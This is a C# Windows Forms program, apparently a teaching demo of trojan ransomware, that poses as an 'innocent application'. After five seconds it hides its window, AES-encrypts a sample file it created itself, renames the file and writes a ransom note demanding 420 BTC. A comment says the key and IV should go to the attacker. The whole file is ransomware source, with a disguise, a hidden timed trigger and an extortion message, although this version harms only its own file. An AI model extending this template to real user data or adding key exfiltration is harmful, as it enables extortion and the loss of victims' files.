using System;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace InnocentApp
{
    internal static class Program
    {
        private static Timer timer = new Timer();
        private static string fileName = "regular_file.txt";
        private static string newFileName = "encrypted_file.txt";
        private static string noteFileName = "ransomware_note.txt";

        /// <summary>
        /// Hlavní vstupní bod aplikace.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            // Delete previous files
            File.Delete(fileName);
            File.Delete(newFileName);
            File.Delete(noteFileName);

            // Create user file
            using (StreamWriter sw = File.CreateText(fileName))
            {
                sw.WriteLine("This is regular user file content.");
                sw.WriteLine("It contains passwords, credit card details and all of users contacts.");
            }
            Console.WriteLine(File.ReadAllText(fileName));

            Form1 form = new Form1();
            form.Text = "I'm innocent application :)";

            timer.Interval = 5000;
            timer.Start();
            timer.Tick += new EventHandler(delegate
            {
                // Hide window
                form.Hide();
                form.ShowInTaskbar = false;
                form.Visible = false;
                form.Text = "Not anymore!";

                // Launch ransomware attack
                try
                {
                    // Read file
                    string fileText;
                    using (StreamReader sr = File.OpenText(fileName))
                    {
                        fileText = sr.ReadToEnd();
                    }

                    // Encrypt file
                    using (AesManaged aes = new AesManaged())
                    {
                        File.WriteAllBytes(fileName, Encrypt(fileText, aes.Key, aes.IV));

                        // Key and IV should be sent to attacker for Decryption
                    }

                    // Rename file
                    File.Move(fileName, newFileName);

                    // Create ransom note
                    using (StreamWriter sw = File.CreateText(noteFileName))
                    {
                        sw.WriteLine("You have been hacked!");
                        sw.WriteLine("Give me 420 BTC or I share your files on the Internet.");
                    }
                }
                catch (Exception ex) {
                    Console.WriteLine(ex.ToString());
                }
            });

            Application.Run(form);
        }

        private static byte[] Encrypt(string plainText, byte[] Key, byte[] IV)
        {
            byte[] encrypted;
            // Create a new AesManaged.    
            using (AesManaged aes = new AesManaged())
            {
                // Create encryptor    
                ICryptoTransform encryptor = aes.CreateEncryptor(Key, IV);
                // Create MemoryStream    
                using (MemoryStream ms = new MemoryStream())
                {
                    // Create crypto stream using the CryptoStream class. This class is the key to encryption    
                    // and encrypts and decrypts data from any given stream. In this case, we will pass a memory stream    
                    // to encrypt    
                    using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    {
                        // Create StreamWriter and write data to a stream    
                        using (StreamWriter sw = new StreamWriter(cs))
                            sw.Write(plainText);
                        encrypted = ms.ToArray();
                    }
                }
            }
            // Return encrypted data    
            return encrypted;
        }
    }
}
